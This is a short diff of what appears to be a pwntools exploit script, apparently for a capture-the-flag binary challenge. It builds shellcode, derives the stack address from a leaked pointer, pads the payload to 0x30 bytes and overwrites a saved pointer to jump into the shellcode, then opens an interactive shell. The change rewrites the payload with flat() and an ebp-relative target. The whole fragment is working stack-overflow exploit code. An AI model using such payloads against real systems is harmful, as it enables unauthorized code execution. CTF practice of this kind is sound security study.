@@ -41,12 +41,14 @@ shell = asm(shell)
 
 #print(len(shell))
 eip = leak - 0x13
+ebp = eip - 0x4
 info("eip: %s"%hex(eip))
 
 pay = shell
 pay += 'a'*(0x30 - len(shell))
 pay += p32(eip-0x30)
 
+pay = flat({0: shell, 0x30: [ebp-0x2c]})
 p.sendline(pay)
 
 p.interactive()
